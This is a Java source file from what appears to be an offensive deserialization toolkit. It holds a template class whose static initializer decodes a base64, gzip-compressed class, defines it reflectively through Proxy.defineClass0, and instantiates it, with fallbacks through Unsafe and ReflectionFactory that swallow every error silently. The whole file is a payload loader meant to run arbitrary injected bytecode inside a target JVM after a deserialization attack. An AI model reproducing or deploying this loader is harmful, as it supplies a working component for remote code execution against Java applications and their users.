package org.su18.ysuserial.payloads.templates;

import sun.reflect.ReflectionFactory;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.zip.GZIPInputStream;

/**
 * ClassLoader define 代码
 */
public class ClassLoaderTemplate {

	static String b64;

	static String className;

	static {
		try {
			GZIPInputStream       gzipInputStream       = new GZIPInputStream(new ByteArrayInputStream(base64Decode(b64)));
			ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
			byte[]                bs                    = new byte[4096];
			int                   read;
			while ((read = gzipInputStream.read(bs)) != -1) {
				byteArrayOutputStream.write(bs, 0, read);
			}
			byte[] bytes = byteArrayOutputStream.toByteArray();

			ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
			Method      method      = Proxy.class.getDeclaredMethod("defineClass0", ClassLoader.class, String.class, byte[].class, int.class, int.class);
			method.setAccessible(true);
			Class invoke = (Class) method.invoke(null, classLoader, className, bytes, 0, bytes.length);
			try {
				// 先尝试 newInstance
				invoke.newInstance();
			} catch (Exception ignored) {
				try {
					// 如果没有无参构造方法，会报错，这里可以使用 Unsafe 创建，个人非常喜欢 Unsafe 这个类，无拘无束，自由自在
					Class unsafe         = Class.forName("sun.misc.Unsafe");
					Field theUnsafeField = unsafe.getDeclaredField("theUnsafe");
					theUnsafeField.setAccessible(true);
					Object unsafeObject = theUnsafeField.get(null);
					unsafeObject.getClass().getDeclaredMethod("allocateInstance", Class.class).invoke(unsafeObject, invoke);
				} catch (Exception neverMind) {
					// 如果没有 Unsafe，可以使用反射库中的方法，为 Class 创建一个
					Constructor objCons = invoke.getDeclaredConstructor(new Class[0]);
					objCons.setAccessible(true);
					Constructor sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(invoke, objCons);
					sc.setAccessible(true);
					sc.newInstance(new Object[0]);
				}
			}
		} catch (Exception ignored) {
		}
	}

	public static byte[] base64Decode(String bs) {
		Class  base64;
		byte[] value = null;
		try {
			base64 = Class.forName("java.util.Base64");
			Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
			value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
		} catch (Exception e) {
			try {
				base64 = Class.forName("sun.misc.BASE64Decoder");
				Object decoder = base64.newInstance();
				value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
			} catch (Exception ignored) {
			}
		}
		return value;
	}
}
